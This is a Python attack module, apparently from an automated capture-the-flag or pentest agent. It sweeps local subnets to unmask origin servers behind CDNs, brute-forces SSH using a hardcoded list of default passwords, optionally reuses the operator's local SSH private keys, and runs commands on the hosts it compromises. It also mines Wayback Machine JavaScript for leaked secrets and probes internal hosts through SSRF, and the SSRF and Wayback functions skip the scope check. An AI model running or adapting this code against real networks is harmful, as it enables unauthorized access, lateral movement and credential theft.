# coding: utf-8
"""lanbreach.py — MrBOOM infra skills: LAN unmasking + SSH access + wayback JS diff.

Ports the core techniques of public GitHub recon tools (no runtime deps):
  - spyboy-productions/CloakQuest3r & musana/CF-Hero (origin fingerprint
    unmasking of CDN/proxy-wrapped hosts -> we match body/title fingerprint
    against direct LAN probes)
  - karma9874/CloudFlare-IP (favicon/body hash matching idea)

Skills:
  1. lan_origin_sweep  — discover the real origin box behind a tunnel/CDN
     by sweeping the local subnet and fingerprint-matching HTTP responses.
     Scope-gated: only runs when engagement opts in (prompt contains
     'infrastructure'/'origin sweep'/'ssh') and the LAN is authorized.
  2. ssh_cred_attack   — low-rate paramiko credential check (defaults +
     device-class passwords like pi/raspberry). Stops at first valid cred,
     then captures id + hostname + flag grep as proof.
  3. wayback_js_diff   — pull archived JS copies from the Wayback Machine,
     extract secrets/endpoints deleted since, and diff against current JS.
  4. ssrf_oracle       — probe internal hosts/ports through a working
     host-param SSRF/primitives (only when one was already confirmed).

Authorized-testing only. Scope enforced via exploit.set_scope/in_scope.
"""
import concurrent.futures
import hashlib
import os
import html
import json
import re
import socket
import ssl
import time
import urllib.parse
import urllib.request

FLAG_RE = re.compile(r"NIMBUS\{[A-Za-z0-9_\-]+\}", re.I)

# device-class + service defaults (Raspberry Pi, generic linux, NAS, cloud)
SSH_CREDS = [
    ("pi", "ROOT"), ("pi", "root"), ("pi", "raspberry"), ("pi", "pi"),
    ("root", "ROOT"), ("root", "root"), ("root", "raspberry"),
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("user", "user"), ("pi", "nimbus"), ("pi", "nimbus123"),
    ("root", "toor"), ("pi", "p@ssw0rd"), ("admin", "changeme"),
]


def _gate(host):
    try:
        import exploit
    except Exception:
        # Fail closed: no gate available -> refuse the action.
        return False
    return hasattr(exploit, "in_scope") and bool(exploit.in_scope(host))


def _http_probe(url, host_header=None, timeout=3):
    try:
        hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
        if host_header:
            hdrs["Host"] = host_header
        req = urllib.request.Request(url, headers=hdrs)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(60000)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(60000)
        except Exception:
            return e.code, b""
    except Exception:
        return 0, b""


def _fingerprint(body):
    if not body:
        return (0, "")
    raw = body.decode("utf-8", "ignore") if isinstance(body, bytes) else body
    size = len(raw)
    title = ""
    m = re.search(r"<title[^>]*>(.*?)</title>", raw, re.I | re.S)
    if m:
        title = re.sub(r"\s+", " ", html.unescape(m.group(1))).strip()[:80]
    sig = hashlib.md5(re.sub(r"\s+", " ", raw)[:3000].encode()).hexdigest()[:10]
    return (size, title, sig)


_VIRTUAL_IFACE = re.compile(r"^(docker|br-|veth|virbr|tailscale|tun|wg|lo|vmnet|vbox)", re.I)

def local_subnets():
    """Infer real-LAN /24 subnet(s); skip loopback, link-local, and virtual
    interfaces (docker bridges, tailscale, VPN tunnels) so sweeps hit only
    physical/private LANs."""
    nets = set()
    try:
        import subprocess
        out = subprocess.run(["ip", "-4", "-o", "addr"], capture_output=True, text=True, timeout=4).stdout
        for line in out.splitlines():
            parts = line.split()
            if len(parts) < 4:
                continue
            iface = parts[1]
            if _VIRTUAL_IFACE.match(iface):
                continue
            m = re.search(r"inet (\d+\.\d+\.\d+)\.(\d+)/(\d+)", line)
            if not m:
                continue
            prefix = m.group(1)
            if prefix.startswith(("127.", "169.254", "100.") ):
                continue
            nets.add(prefix)
    except Exception:
        pass
    return sorted(nets)

_KNOWN_KEYS = [
    os.path.expanduser("~/.ssh/id_ed25519"), os.path.expanduser("~/.ssh/id_rsa"),
    os.path.expanduser("~/.ssh/id_ecdsa"), os.path.expanduser("~/.ssh/id_dsa"),
]

def _ssh_key_auth(host, username, keypath, timeout=6):
    try:
        import paramiko
        keyobj = None
        for cls in (paramiko.Ed25519Key, paramiko.RSAKey, paramiko.ECDSAKey, paramiko.DSSKey):
            try:
                keyobj = cls.from_private_key_file(keypath)
                break
            except Exception:
                continue
        if keyobj is None:
            return False, ""
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(host, port=22, username=username, pkey=keyobj, timeout=timeout,
                  allow_agent=False, look_for_keys=False,
                  banner_timeout=timeout, auth_timeout=timeout)
        proof = ""
        try:
            _, stdout, _ = c.exec_command("id; hostname; grep -rhoE 'NIMBUS\\{[^}]+\\}' /opt/*/data /opt/*/data/vault /home 2>/dev/null | head -3", timeout=10)
            proof = stdout.read().decode("utf-8", "ignore")[:600]
        except Exception:
            pass
        try:
            c.close()
        except Exception:
            pass
        return True, proof
    except Exception:
        return False, ""


def _probe_host(ip, port, host_header, timeout=2.5):
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{ip}:{port}/"
    st, body = _http_probe(url, host_header=host_header, timeout=timeout)
    return ip, port, st, body


def ssh_port_open(ip, port=22, timeout=2):
    if not _gate(ip):
        return False
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        return True
    except Exception:
        return False
    finally:
        s.close()


def lan_origin_sweep(domain, live_bodies=None, max_hosts=60, ports=(80, 443, 8001, 8080, 8443, 8000)):
    """Sweep local subnet(s) for the real origin box behind the target.

    Fingerprint the tunnel-served content, then probe every LAN host on web
    ports (sending Host: domain) and match by title/body sig/size. Also
    records which LAN hosts have SSH open for the credential skill.
    CloakQuest3r-style: fingerprint-match beats DNS history when the box
    sits on a private LAN behind a quick tunnel.
    """
    result = {"origins": [], "ssh_open": [], "lan_hosts": 0}
    nets = local_subnets()
    if not nets:
        return result

    fp = None
    for st, body in (live_bodies or []):
        if st == 200 and body and len(body) > 200:
            fp = _fingerprint(body)
            break
    if not fp:
        try:
            st, body = _http_probe("https://" + domain + "/", timeout=4)
            if st == 200:
                fp = _fingerprint(body)
        except Exception:
            pass

    hosts = []
    for net in nets[:2]:
        for i in range(1, max_hosts + 1):
            hosts.append(f"{net}.{i}")

    candidates = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
        ssh_futs = {ex.submit(ssh_port_open, h): h for h in hosts}
        for f in concurrent.futures.as_completed(ssh_futs):
            try:
                if f.result():
                    result["ssh_open"].append(ssh_futs[f])
            except Exception:
                pass
        web_futs = []
        for h in hosts:
            for p in ports:
                web_futs.append(ex.submit(_probe_host, h, p, domain))
        for f in concurrent.futures.as_completed(web_futs):
            try:
                ip, port, st, body = f.result()
            except Exception:
                continue
            if st == 0 or not body:
                continue
            if fp:
                f2 = _fingerprint(body)
                hit_title = f2[1] and f2[1] == fp[1]
                hit_sig = f2[2] == fp[2]
                hit_size = abs(f2[0] - fp[0]) <= max(64, int(fp[0] * 0.15))
                if hit_title or hit_sig or (hit_size and f2[0] > 300):
                    candidates.append({
                        "ip": ip, "port": port, "scheme": "https" if port in (443, 8443) else "http",
                        "match": "title" if hit_title else ("sig" if hit_sig else "size"),
                        "title": f2[1], "size": f2[0], "confirmed": True,
                        "evidence": f"LAN fingerprint match ({'title' if hit_title else 'sig' if hit_sig else 'size'}): title={f2[1][:50]} size={f2[0]}",
                    })
    seen = set()
    for c in candidates:
        k = (c["ip"], c["port"])
        if k in seen:
            continue
        seen.add(k)
        result["origins"].append(c)
    result["lan_hosts"] = len(hosts)
    return result


def ssh_cred_attack(hosts, creds=None, timeout=6, delay=0.4, allow_local_keys=False):
    """Low-and-slow SSH credential check against confirmed LAN boxes.

    Stops per-host at the first valid credential, then runs a single
    read-only proof command (id; hostname) and a flag grep. Scope-gated.
    """
    try:
        import paramiko
    except Exception:
        return {"error": "paramiko not installed", "results": []}
    creds = creds or SSH_CREDS
    results = []
    key_users = []
    if allow_local_keys:
        for kp in _KNOWN_KEYS:
            if os.path.exists(kp):
                for u in ("pi", "root", "admin"):
                    key_users.append((u, kp))
    for host in hosts[:5]:
        host = host.split(":")[0]
        if not _gate(host):
            results.append({"host": host, "success": False, "evidence": "out of scope — refused"})
            continue
        if not ssh_port_open(host):
            continue
        found = None
        for user, kp in key_users:
            ok, proof = _ssh_key_auth(host, user, kp)
            if ok:
                found = {"host": host, "success": True, "username": user, "key": os.path.basename(kp),
                         "evidence": f"SSH key login ok ({user}@{host} via {os.path.basename(kp)}) | {proof.strip()[:400]}",
                         "flag": (FLAG_RE.search(proof).group(0) if FLAG_RE.search(proof) else "")}
                break
        if found:
            results.append(found)
            continue
        for user, pw in creds:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                c.connect(host, port=22, username=user, password=pw, timeout=timeout,
                          allow_agent=False, look_for_keys=False,
                          banner_timeout=timeout, auth_timeout=timeout)
                proof = ""
                try:
                    _, stdout, _ = c.exec_command("id; hostname; grep -rhoE 'NIMBUS\\{[^}]+\\}' /opt/*/data /opt/*/data/vault /home 2>/dev/null | head -3", timeout=10)
                    proof = stdout.read().decode("utf-8", "ignore")[:600]
                except Exception:
                    pass
                found = {"host": host, "success": True, "username": user, "password": pw,
                         "evidence": f"SSH login ok ({user}/{pw}) | {proof.strip()[:400]}",
                         "flag": (FLAG_RE.search(proof).group(0) if FLAG_RE.search(proof) else "")}
                try:
                    c.close()
                except Exception:
                    pass
                break
            except paramiko.AuthenticationException:
                time.sleep(delay)
                continue
            except Exception:
                continue
        results.append(found or {"host": host, "success": False, "evidence": "no valid creds"})
    return {"results": results}


def wayback_js_diff(domain, current_js_paths=("/assets/main.js", "/main.js"), timeout=10):
    """Pull Wayback-archived copies of JS bundles and diff out what was
    deleted since (dev blocks, route maps, leaked endpoint lists, secrets)."""
    findings = []
    secret_re = re.compile(
        r"(sk_live_[A-Za-z0-9]{16,}|AKIA[0-9A-Z]{16}|eyJ[A-Za-z0-9_\-\.]{20,}|"
        r"X-[A-Za-z\-]*Debug|/api/v\d+/[a-z_/\-]+|nim_live_[a-z0-9]+|secret|PRIVATE KEY)",
        re.I)
    try:
        cdx = f"https://web.archive.org/cdx/search/cdx?url={urllib.parse.quote(domain)}/*&output=json&fl=timestamp,original&filter=statuscode:200&limit=600&collapse=original"
        req = urllib.request.Request(cdx, headers={"User-Agent": "Mozilla/5.0"})
        rows = json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "ignore"))
        js_urls = []
        for ts, orig in rows[1:]:
            if re.search(r"\.(js|json)(\?|$)", orig) and domain in orig:
                js_urls.append((ts, orig))
        js_urls = list(dict.fromkeys(o for _, o in js_urls))[:6]
        for orig in js_urls:
            if orig.split("//")[0]:
                snap = "http://" + orig if not orig.startswith("http") else orig
                wb = f"https://web.archive.org/web/0/{snap}"
                st, body = _http_probe(wb, timeout=12)
                if st != 200 or not body:
                    continue
                txt = body.decode("utf-8", "ignore")
                hits = sorted(set(m.group(0) for m in secret_re.finditer(txt)))[:25]
                endpoints = sorted(set(m.group(0) for m in re.finditer(r"/api/v\d+/[a-z_/\-]+", txt)))[:20]
                dev_block = "DEV BLOCK" in txt or "X-Nimbus-Debug" in txt or "dev(" in txt
                if hits or endpoints or dev_block:
                    findings.append({
                        "url": orig, "severity": "high", "kind": "wayback_js_history",
                        "secrets": hits, "endpoints": endpoints, "dev_block": dev_block,
                        "evidence": f"archived JS exposes {len(hits)} secret-like tokens, {len(endpoints)} endpoints, dev_block={dev_block}",
                    })
    except Exception as e:
        findings.append({"kind": "wayback_js_error", "evidence": str(e)[:120], "severity": "info"})
    return findings


def ssrf_oracle(endpoint, host_param="host", internal_hosts=("localhost", "127.0.0.1"), timeout=4):
    """If a live host-param SSRF was confirmed, use it to map internal
    hosts/ports. Returns a table of live internal services."""
    out = []
    try:
        for ih in internal_hosts[:6]:
            url = endpoint + ("&" if "?" in endpoint else "?") + host_param + "=" + urllib.parse.quote(ih)
            st, body = _http_probe(url, timeout=timeout)
            if st == 200 and body:
                txt = body.decode("utf-8", "ignore")
                if "PING" in txt or "64 bytes from" in txt:
                    out.append({"host": ih, "alive": True, "evidence": txt[:160]})
                else:
                    out.append({"host": ih, "alive": st == 200, "evidence": txt[:160]})
    except Exception as e:
        out.append({"host": "?", "alive": False, "evidence": str(e)[:120]})
    return {"internal": out}
